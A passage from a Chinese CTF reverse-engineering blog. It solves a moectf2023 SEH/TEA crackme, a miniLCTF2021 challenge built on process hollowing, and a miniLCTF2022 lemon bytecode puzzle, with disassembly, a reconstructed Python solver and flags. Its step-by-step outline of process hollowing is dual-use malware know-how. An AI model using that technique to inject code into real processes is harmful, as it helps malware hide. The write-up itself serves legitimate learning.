revenge!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know TEA(an encryption algorithm)? Do you know unwind in SEH? &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I believe you can understand them! So let me check your flag~&quot;</span>);</span><br><span class="line">  sub_EC10CD(<span class="string">&quot;Input:&quot;</span>, v4);</span><br><span class="line">  sub_EC13CA(<span class="string">&quot;%64s&quot;</span>, (<span class="type">char</span>)&amp;byte_ECA578);</span><br><span class="line">  MEMORY[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_EC10FF();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Right flag! Have fun in moectf2023~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大大的红色 MEMORY来触发内存访问异常<br>根据异常处理可以找到会跳转到这里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">loc_EC5928:</span><br><span class="line">;   __except(loc_EC5922) <span class="comment">// owned by EC5908</span></span><br><span class="line">mov     esp, [ebp+ms_exc.old_esp]</span><br><span class="line">push    offset aDx3906  ; <span class="string">&quot;DX3906&quot;</span></span><br><span class="line">push    offset byte_ECA578 ; <span class="type">unsigned</span> <span class="type">int</span> *</span><br><span class="line">call    j_XXTEA</span><br><span class="line">add     esp, <span class="number">8</span></span><br><span class="line">push    offset aDoctor3 ; <span class="string">&quot;doctor3&quot;</span></span><br><span class="line">push    offset dword_ECA580 ; <span class="type">unsigned</span> <span class="type">int</span> *</span><br><span class="line">call    j_XXTEA</span><br><span class="line">add     esp, <span class="number">8</span></span><br><span class="line">push    offset aFux1aoyun ; <span class="string">&quot;FUX1AOYUN&quot;</span></span><br><span class="line">push    offset dword_ECA588 ; <span class="type">unsigned</span> <span class="type">int</span> *</span><br><span class="line">call    j_XXTEA</span><br><span class="line">add     esp, <span class="number">8</span></span><br><span class="line">push    offset aR3verier ; <span class="string">&quot;R3verier&quot;</span></span><br><span class="line">push    offset dword_ECA590 ; <span class="type">unsigned</span> <span class="type">int</span> *</span><br><span class="line">call    j_XXTEA</span><br><span class="line">add     esp, <span class="number">8</span></span><br><span class="line">mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFEh</span><br></pre></td></tr></table></figure><p>代码那儿标注错了(应该只是tea&#x2F;xtea)<br>总之会先经过第一遍的四次tea加密</p><p>动调会发现输入的input会被分成8组 (每组两个)<br>查看交叉引用会发现后面还调用了tea加密 在这里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">; <span class="keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD *<span class="title function_">sub_EC1820</span><span class="params">()</span></span><br><span class="line">sub_EC1820 proc near</span><br><span class="line"></span><br><span class="line">var_E4= dword ptr <span class="number">-0E4</span>h</span><br><span class="line">var_10= byte ptr <span class="number">-10</span>h</span><br><span class="line">var_C= dword ptr <span class="number">-0</span>Ch</span><br><span class="line">var_4= dword ptr <span class="number">-4</span></span><br><span class="line"></span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">sub     esp, <span class="number">0</span>D0h</span><br><span class="line">push    ebx</span><br><span class="line">push    esi</span><br><span class="line">push    edi</span><br><span class="line">lea     edi, [ebp+var_10]</span><br><span class="line">mov     ecx, <span class="number">4</span></span><br><span class="line">mov     eax, <span class="number">0</span>CCCCCCCCh</span><br><span class="line">rep stosd</span><br><span class="line">mov     eax, ___security_cookie</span><br><span class="line">xor     eax, ebp</span><br><span class="line">mov     [ebp+var_4], eax</span><br><span class="line">mov     [ebp+var_C], offset j_ENCRPYT</span><br><span class="line">push    [ebp+var_C]</span><br><span class="line">push    large dword ptr fs:<span class="number">0</span></span><br><span class="line">mov     large fs:<span class="number">0</span>, esp</span><br><span class="line"><span class="type">int</span>     <span class="number">3</span>               ; Trap to Debugger</span><br><span class="line">mov     eax, [esp+<span class="number">0E4</span>h+var_E4]</span><br><span class="line">mov     large fs:<span class="number">0</span>, eax</span><br><span class="line">add     esp, <span class="number">8</span></span><br><span class="line">pop     edi</span><br><span class="line">pop     esi</span><br><span class="line">pop     ebx</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">xor     ecx, ebp        ; StackCookie</span><br><span class="line">call    j_@__security_check_cookie@<span class="number">4</span> ; __security_check_cookie(x)</span><br><span class="line">add     esp, <span class="number">0</span>D0h</span><br><span class="line">cmp     ebp, esp</span><br><span class="line">call    j___RTC_CheckEsp</span><br><span class="line">mov     esp, ebp</span><br><span class="line">pop     ebp</span><br><span class="line">retn</span><br><span class="line">sub_EC1820 endp</span><br></pre></td></tr></table></figure><p>注意到这里的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, ___security_cookie</span><br><span class="line">xor     eax, ebp</span><br><span class="line">mov     [ebp+var_4], eax</span><br><span class="line">mov     [ebp+var_C], offset j_ENCRYPT</span><br><span class="line">push    [ebp+var_C]</span><br><span class="line">push    large dword ptr fs:<span class="number">0</span></span><br><span class="line">mov     large fs:<span class="number">0</span>, esp</span><br></pre></td></tr></table></figure><p>是在xor还原scopetable检查栈帧完整性过后 新的一个__try块之前 插入了一个异常链表节点(这里我改名了)<br>第一次被 RtlDispatchException 调用，紧接着在栈展开时又被调用一次 (被加入异常链表的函数每次异常触发会被调用两次!!!)<br>所以说这个ENCRYPT(tea)被调用了两次 也就是后4组是连续tea了两次的!!!</p><p>而第一次的四次tea加密只有一遍是因为这时只是触发异常跳到对应的except handler地方 直接调用了4次tea(不是作为异常链表中的handler function)<br>所以不会在展开的时候再遍历一遍<br>同时也要注意到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00</span>EC598F                         loc_EC598F:                             ; DATA XREF: .rdata:stru_EC92E8↓o</span><br><span class="line">.text:<span class="number">00</span>EC598F                         ;   __except filter <span class="comment">// owned by EC597A</span></span><br><span class="line">.text:<span class="number">00</span>EC598F B8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                          mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00</span>EC5994 C3                                      retn</span><br></pre></td></tr></table></figure><p>这里的返回值1就是 EXCEPTION_EXECUTE_HANDLER 所以会进行全局展开<br>再借文章的话来阐释更清楚一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">既然有了前面知识的铺垫，那么这一段汇编代码理解起来应该没有什么难度：</span><br><span class="line">注意到 .text:0041590F 处会触发了一个读写非法地址异常，往下紧接着就是 __except filter，它直接返回了 1，</span><br><span class="line">也就是 EXCEPTION_EXECUTE_HANDLER，根据前面的知识，</span><br><span class="line">__except_handler4 在获取 FilterFunc 后会根据调用 filter 并根据 FilterResult 决定下一步的操作，</span><br><span class="line">这里为 1，故会进行全局展开，也就是接着调用 RtlUnwind，</span><br><span class="line">RtlUnwind 又会起一个 EH4_EXCEPTION_REGISTRATION-&gt;Handler，也就是我们这里的 __except 块</span><br></pre></td></tr></table></figure><p>然后将那四个字符串分别对应4个DWORD KEY[] 逆就行了</p><h1 id="miniLCTF2021"><a href="#miniLCTF2021" class="headerlink" title="miniLCTF2021"></a>miniLCTF2021</h1><h2 id="sub"><a href="#sub" class="headerlink" title="sub"></a>sub</h2><p>参考:<br><a href="https://blog.csdn.net/weixin_41890599/article/details/102642043"> + </a></p><p>考察点是傀儡进程注入<br>在track师傅博客瞅到 就做了做</p><p>首先用CFF查看 发现有一个节区比较奇怪 节区名为  .what?<br>IDA查看main<br>很经典的进程注入结构</p><ol><li>以挂起的方式创建一个进程</li><li>卸载该进程的内存映射 i.e 清空进程虚拟内存空间中的内容</li><li>获取该进程的CONTEXT上下文结构</li><li>将要注入的内存读取到内存中</li><li>在傀儡进程中申请足够的内存空间</li><li>将要注入的程序写入申请的空间</li><li>设置CONTEXT上下文的eax为程序入口点 ebx+8为程序基址</li><li>恢复线程</li></ol><p>理解这一点后 注意到<br>sub_401000((int)Block, ElementCount);<br>是对 段进行xor 0x64 操作<br>将 .what?段dump出来 xor后得到隐藏PE文件<br>IDA逆向<br>一个简单的变换操作<br>正常流程解出来是假flag<br>注意到有Tls 查看发现替换了函数地址<br>用真正的加密函数逆向得到真flag<br><strong>miniLctf{Re_1s_s0_1nt4r4st1ng!!}</strong></p><hr><hr><p>源码的函数替换实现:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bool</span> (*check)(<span class="type">char</span>* flag, <span class="type">int</span> len) = fake_check;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">fake_check</span><span class="params">(...)</span>...</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">true_check</span><span class="params">(...)</span>...</span></span><br></pre></td></tr></table></figure><h1 id="miniLCTF2022"><a href="#miniLCTF2022" class="headerlink" title="miniLCTF2022"></a>miniLCTF2022</h1><h2 id="lemon"><a href="#lemon" class="headerlink" title="lemon"></a>lemon</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line">0: const 25 ; &lt;module &#x27;main&#x27;&gt; </span><br><span class="line">5: module 1 590</span><br><span class="line">11: const 26 ; &lt;module &#x27;src&#x27;&gt; </span><br><span class="line">16: store 0 0</span><br><span class="line">19: const 26 ; &lt;module &#x27;src&#x27;&gt; </span><br><span class="line">24: module 6 590</span><br><span class="line">30: const 27 ; 221492336 </span><br><span class="line">35: store 0 0</span><br><span class="line">38: const 28 ; next </span><br><span class="line">43: define 0 0 0 0 80</span><br><span class="line">52: load 1 0</span><br><span class="line">55: const 29 ; 3735928559 </span><br><span class="line">60: mul</span><br><span class="line">61: const 30 ; 2974593325 </span><br><span class="line">66: add</span><br><span class="line">67: const 31 ; 4294967295 </span><br><span class="line">72: mod</span><br><span class="line">73: store 1 0</span><br><span class="line">76: load 1 0</span><br><span class="line">79: return</span><br><span class="line">80: store 0 1</span><br><span class="line">83: const 32 ; n </span><br><span class="line">88: const 33 ; __init__ </span><br><span class="line">93: define 0 0 1 2 377</span><br><span class="line">102: array 0</span><br><span class="line">107: self</span><br><span class="line">108: const 34 ; enc </span><br><span class="line">113: setattr</span><br><span class="line">114: array 0</span><br><span class="line">119: self</span><br><span class="line">120: const 35 ; flag </span><br><span class="line">125: setattr</span><br><span class="line">126: const 36 ; 330150339 </span><br><span class="line">131: const 37 ; 665229750 </span><br><span class="line">136: const 38 ; 1030425184 </span><br><span class="line">141: const 39 ; 626644061 </span><br><span class="line">146: const 40 ; 861166604 </span><br><span class="line">151: const 41 ; 521761774 </span><br><span class="line">156: const 42 ; 586337393 </span><br><span class="line">161: const 43 ; 167708778 </span><br><span class="line">166: const 44 ; 495518230 </span><br><span class="line">171: const 45 ; 459905620 </span><br><span class="line">176: const 46 ; 47689903 </span><br><span class="line">181: const 47 ; 541128627 </span><br><span class="line">186: const 48 ; 735310319 </span><br><span class="line">191: const 49 ; 924471115 </span><br><span class="line">196: const 50 ; 66957703 </span><br><span class="line">201: const 51 ; 827308967 </span><br><span class="line">206: const 52 ; 4680810 </span><br><span class="line">211: const 53 ; 618187854 </span><br><span class="line">216: const 54 ; 1041878913 </span><br><span class="line">221: const 55 ; 424705310 </span><br><span class="line">226: const 56 ; 258515107 </span><br><span class="line">231: const 57 ; 301365991 </span><br><span class="line">236: const 58 ; 238089888 </span><br><span class="line">241: const 59 ; 126810196 </span><br><span class="line">246: const 60 ; 160092960 </span><br><span class="line">251: const 61 ; 333469062 </span><br><span class="line">256: const 62 ; 524809386 </span><br><span class="line">261: const 63 ; 334234642 </span><br><span class="line">266: const 64 ; 532732060 </span><br><span class="line">271: const 65 ; 701306806 </span><br><span class="line">276: const 66 ; 755999918 </span><br><span class="line">281: const 67 ; 219942343 </span><br><span class="line">286: const 68 ; 37219027 </span><br><span class="line">291: const 69 ; 76267819 </span><br><span class="line">296: const 70 ; 2141786733 </span><br><span class="line">301: array 35</span><br><span class="line">306: self</span><br><span class="line">307: const 71 ; res </span><br><span class="line">312: setattr</span><br><span class="line">313: const 72 ; 0 </span><br><span class="line">318: store 0 1</span><br><span class="line">321: load 0 1</span><br><span class="line">324: load 0 0</span><br><span class="line">327: lt</span><br><span class="line">328: jz 371</span><br><span class="line">333: self</span><br><span class="line">334: const 34 ; enc </span><br><span class="line">339: getattr</span><br><span class="line">340: const 73 ; append </span><br><span class="line">345: getattr</span><br><span class="line">346: load 1 1</span><br><span class="line">349: call 0</span><br><span class="line">351: call 1</span><br><span class="line">353: pop</span><br><span class="line">354: load 0 1</span><br><span class="line">357: const 74 ; 1 </span><br><span class="line">362: add</span><br><span class="line">363: store 0 1</span><br><span class="line">366: jmp 321</span><br><span class="line">371: const 75 ; nil </span><br><span class="line">376: return</span><br><span class="line">377: const 33 ; __init__ </span><br><span class="line">382: const 76 ; x </span><br><span class="line">387: const 77 ; y </span><br><span class="line">392: const 78 ; sign </span><br><span class="line">397: define 0 0 2 3 482</span><br><span class="line">406: const 72 ; 0 </span><br><span class="line">411: store 0 2</span><br><span class="line">414: load 0 2</span><br><span class="line">417: const 79 ; 35 </span><br><span class="line">422: lt</span><br><span class="line">423: jz 476</span><br><span class="line">428: self</span><br><span class="line">429: const 35 ; flag </span><br><span class="line">434: getattr</span><br><span class="line">435: const 73 ; append </span><br><span class="line">440: getattr</span><br><span class="line">441: load 0 0</span><br><span class="line">444: load 0 2</span><br><span class="line">447: getitem</span><br><span class="line">448: load 0 1</span><br><span class="line">451: load 0 2</span><br><span class="line">454: getitem</span><br><span class="line">455: bxor</span><br><span class="line">456: call 1</span><br><span class="line">458: pop</span><br><span class="line">459: load 0 2</span><br><span class="line">462: const 74 ; 1 </span><br><span class="line">467: add</span><br><span class="line">468: store 0 2</span><br><span class="line">471: jmp 414</span><br><span class="line">476: const 75 ; nil </span><br><span class="line">481: return</span><br><span class="line">482: const 78 ; sign </span><br><span class="line">487: const 80 ; RunMe </span><br><span class="line">492: class 4 0</span><br><span class="line">495: store 0 2</span><br><span class="line">498: const 23 ; &lt;function &#x27;print&#x27;&gt; </span><br><span class="line">503: const 81 ; [+] Starting... </span><br><span class="line">508: call 1</span><br><span class="line">510: pop</span><br><span class="line">511: load 0 2</span><br><span class="line">514: const 79 ; 35 </span><br><span class="line">519: call 1</span><br><span class="line">521: store 0 5</span><br><span class="line">524: load 0 5</span><br><span class="line">527: const 78 ; sign </span><br><span class="line">532: getattr</span><br><span class="line">533: load 0 5</span><br><span class="line">536: const 71 ; res </span><br><span class="line">541: getattr</span><br><span class="line">542: load 0 5</span><br><span class="line">545: const 34 ; enc </span><br><span class="line">550: getattr</span><br><span class="line">551: call 2</span><br><span class="line">553: pop</span><br><span class="line">554: const 23 ; &lt;function &#x27;print&#x27;&gt; </span><br><span class="line">559: load 0 5</span><br><span class="line">562: const 35 ; flag </span><br><span class="line">567: getattr</span><br><span class="line">568: call 1</span><br><span class="line">570: pop</span><br><span class="line">571: const 23 ; &lt;function &#x27;print&#x27;&gt; </span><br><span class="line">576: const 82 ; [+] Done! </span><br><span class="line">581: call 1</span><br><span class="line">583: pop</span><br><span class="line">584: const 75 ; nil </span><br><span class="line">589: return</span><br></pre></td></tr></table></figure><p>lemon官方文档全挂了。。。<br>磕磕绊绊还原一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">seed = <span class="number">0xd33b470</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next</span>():</span><br><span class="line">    <span class="keyword">global</span> seed</span><br><span class="line">    seed = (seed * <span class="number">0xdeadbeef</span> + <span class="number">0xb14cb12d</span>) % <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RunMe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,n</span>):</span><br><span class="line">        self.enc = []</span><br><span class="line">        self.flag = []</span><br><span class="line">        self.res = [<span class="number">2141786733</span>, <span class="number">76267819</span>, <span class="number">37219027</span>, <span class="number">219942343</span>, <span class="number">755999918</span>, <span class="number">701306806</span>, <span class="number">532732060</span>, <span class="number">334234642</span>, <span class="number">524809386</span>, <span class="number">333469062</span>, <span class="number">160092960</span>, <span class="number">126810196</span>, <span class="number">238089888</span>, <span class="number">301365991</span>, <span class="number">258515107</span>, <span class="number">424705310</span>, <span class="number">1041878913</span>, <span class="number">618187854</span>, <span class="number">4680810</span>, <span class="number">827308967</span>, <span class="number">66957703</span>, <span class="number">924471115</span>, <span class="number">735310319</span>, <span class="number">541128627</span>, <span class="number">47689903</span>, <span class="number">459905620</span>, <span class="number">495518230</span>, <span class="number">167708778</span>, <span class="number">586337393</span>, <span class="number">521761774</span>, <span class="number">861166604</span>, <span class="number">626644061</span>, <span class="number">1030425184</span>, <span class="number">665229750</span>, <span class="number">330150339</span>]</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; n):</span><br><span class="line">            self.enc.append(<span class="built_in">next</span>())</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self,x,y</span>):</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">35</span>) :</span><br><span class="line">            self.flag.append(x[i] ^ y[i])</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Starting...&quot;</span>)</span><br><span class="line"></span><br><span class="line">my_run = RunMe(<span class="number">35</span>)</span><br><span class="line">my_run.sign(my_run.enc, my_run.res)</span><br><span class="line"><span class="built_in">print</span>(my_run.flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Done!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是用python运行得不到结果… 貌似是取模运算不太一样? 总之要还原成lemon后用它自己的编译器运行</p><p>大致记录一下吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">const 27 ; 221492336    // LCG</span><br><span class="line">35: store 0 0 </span><br><span class="line">38: const 28 ; next </span><br><span class="line">43: define 0 0 0 0 80</span><br><span class="line">52: load 1 0</span><br><span class="line">55: const 29 ; 3735928559 </span><br><span class="line">60: mul</span><br><span class="line">61: const 30 ; 2974593325 </span><br><span class="line">66: add</span><br><span class="line">67: const 31 ; 4294967295 </span><br><span class="line">72: mod</span><br><span class="line">73: store 1 0  // (a*3735928559+2974593325)%4294967295</span><br><span class="line">76: load 1 0</span><br><span class="line">79: return</span><br></pre></td></tr></table></figure><p>这里define就是lemon定义函数的格式 前面的const就是函数名<br>这里的 load 1 0 加载的是全局变量const 27<br>就是一个LCG的过程 初始seed为 const 27</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">self</span><br><span class="line">120: const 35 ; flag </span><br><span class="line">125: setattr</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">296: const 70 ; 2141786733 </span><br><span class="line">301: array 35</span><br><span class="line">306: self</span><br><span class="line">307: const 71 ; res </span><br><span class="line">312: setattr</span><br><span class="line">313: const 72 ; 0 </span><br><span class="line">318: store 0 1</span><br></pre></td></tr></table></figure><p>这里是将这一大堆数循环存入 res里<br>而且要注意 由于是压栈 所以这数组是倒序的 也就是 [2141786733,…,330150339]!!!</p><p>然后是这一段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">321: load 0 1</span><br><span class="line">324: load 0 0</span><br><span class="line">327: lt</span><br><span class="line">328: jz 371</span><br><span class="line">333: self</span><br><span class="line">334: const 34 ; enc      // 循环存储到 enc[]</span><br><span class="line">339: getattr</span><br><span class="line">340: const 73 ; append </span><br><span class="line">345: getattr</span><br><span class="line">346: load 1 1</span><br><span class="line">349: call 0</span><br><span class="line">351: call 1     </span><br><span class="line">353: pop</span><br><span class="line">354: load 0 1</span><br><span class="line">357: const 74 ; 1 </span><br><span class="line">362: add</span><br><span class="line">363: store 0 1   // +=1</span><br><span class="line">366: jmp 321</span><br></pre></td></tr></table></figure><p>这里的call 0  call 1   是 append 和 next<br>所以是 enc.append(next()) 也就是把LCG每次变换的seed存入enc数组</p><p>然后是这段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">377: const 33 ; __init__ </span><br><span class="line">382: const 76 ; x </span><br><span class="line">387: const 77 ; y </span><br><span class="line">392: const 78 ; sign </span><br><span class="line">397: define 0 0 2 3 482</span><br><span class="line">406: const 72 ; 0 </span><br><span class="line">411: store 0 2</span><br><span class="line">414: load 0   // loop 414-471</span><br><span class="line">417: const 79 ; 35 </span><br><span class="line">422: lt</span><br><span class="line">423: jz          // for 0~35</span><br><span class="line">428: self</span><br><span class="line">429: const 35 ; flag </span><br><span class="line">434: getattr</span><br><span class="line">435: const 73 ; append         // flag.append()</span><br><span class="line">440: getattr</span><br><span class="line">441: load 0 0</span><br><span class="line">444: load 0 2</span><br><span class="line">447: getitem</span><br><span class="line">448: load 0 1</span><br><span class="line">451: load 0 2</span><br><span class="line">454: getitem</span><br><span class="line">455: bxor      // xor!</span><br><span class="line">456: call 1</span><br><span class="line">458: pop</span><br><span class="line">459: load 0 2</span><br><span class="line">462: const 74 ; 1 </span><br><span class="line">467: add</span><br><span class="line">468: store 0 2</span><br><span class="line">471: jmp 414</span><br><span class="line">476: const 75 ; nil 